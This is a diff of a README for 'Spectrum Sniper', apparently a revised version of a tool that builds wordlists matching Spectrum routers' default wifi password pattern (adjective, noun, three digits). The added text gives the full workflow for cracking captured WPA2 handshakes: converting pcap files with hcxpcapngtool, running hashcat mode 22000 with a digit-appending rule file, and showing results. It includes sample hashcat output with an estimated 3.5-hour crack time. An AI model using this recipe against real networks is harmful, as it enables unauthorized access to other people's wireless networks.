@@ -1,8 +1,18 @@
-<-- Spectrum (⌐■_■) ▄︻デ══━一 Sniper -->
+<-- Spectrum (⌐■_■) ▄︻デ══━一 Sniper --> (WIP)
 
-#Spectrum wordlist generator  for Spectrum default wifi logins
+A wordlist generator for cracking WPA2 handshakes using Spectrum's default naming scheme.
+Spectrum routers use the naming scheme of adj + noun + 3 digit numbers.
+This project contains an adjectives file, noun file, and a ruleset to meet these requirements.
+Simply edit the adjective and noun lists to your liking, then run the python script to generate your wordlist.
+You can also edit the ruleset to your needs. For example, if you already know the three digits for some reason.
 
-#Use of defult wifi credentials is too common, this takes avantage of that
+Takes about 3.5hrs using a Radeon 7800 xt for a single hash (see output below)
+
+Original by Nova-Sec - https://github.com/Nova-Sec/SpectrumSniper.git
+My refined, slightly faster and simpler to use version
+	- Smaller wordlists for faster, more targeted cracking
+	- Uses a rule file for modularity and customization
+
 
 ##################################
 Requirements
@@ -20,7 +30,39 @@ Instructions for use
 1. Setting up the wordlist
 	- Add or reomve entries from nouns and adjectives as you see fit. The default is pretty decent but probably contains extraneous words.
 	- Run "python3 wordlist.py"
-	- Script will output the file "wordlist.txt"
+	- Script will output the file "SpectrumSniper.txt"
 
 2. Preparing the handshake capture
-	- 
+	- cd to wherever the handshakes are stored
+	- hcxpcapngtool *.pcap -o candidates.hc22000 -E essid.wordlist
+
+3. Cracking the hashes
+
+	- in same directory as candidates.hc22000
+	- hashcat -m 22000 candidates.hc22000 -r /location/of/SpectrumSniper.rule /location/of/wordlist.txt
+		- This starts an attack on the candidates file using the rules file to add 3 digit numbers to each entry, and uses the wordlist created by the python script
+	- hashcat -m 22000 candidates.hc22000 --show (this will show the results)
+
+	##############################
+	Example Output and timing
+	##############################
+
+	Session..........: hashcat
+	Status...........: Running
+	Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
+	Hash.Target......: candidates.hc22000
+	Time.Started.....: Tue Jan 23 14:42:32 2024 (11 secs)
+	Time.Estimated...: Tue Jan 23 18:09:40 2024 (3 hours, 26 mins)
+	Kernel.Feature...: Pure Kernel
+	Guess.Base.......: File (/usr/share/wordlists/SpectrumSniper.txt)
+	Guess.Mod........: Rules (/usr/share/rulesets/SpectrumSniper.rule)
+	Guess.Queue......: 1/1 (100.00%)
+	Speed.#2.........: 811.2 kH/s (8.75ms) @ Accel:1024 Loops:32 Thr:32 Vec:1
+	Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+	Progress.........: 19626660/10093609800 (0.19%)
+	Rejected.........: 10779300/19626660 (54.92%)
+	Restore.Point....: 0/11215122 (0.00%)
+	Restore.Sub.#2...: Salt:0 Amplifier:9-10 Iteration:1248-1280
+	Candidate.Engine.: Device Generator
+	Candidates.#2....: abandonedatm109 -> braveoutside109
+	Hardware.Mon.#2..: Temp: 55c Fan: 21% Util: 96% Core:2362MHz Mem:1218MHz Bus:16
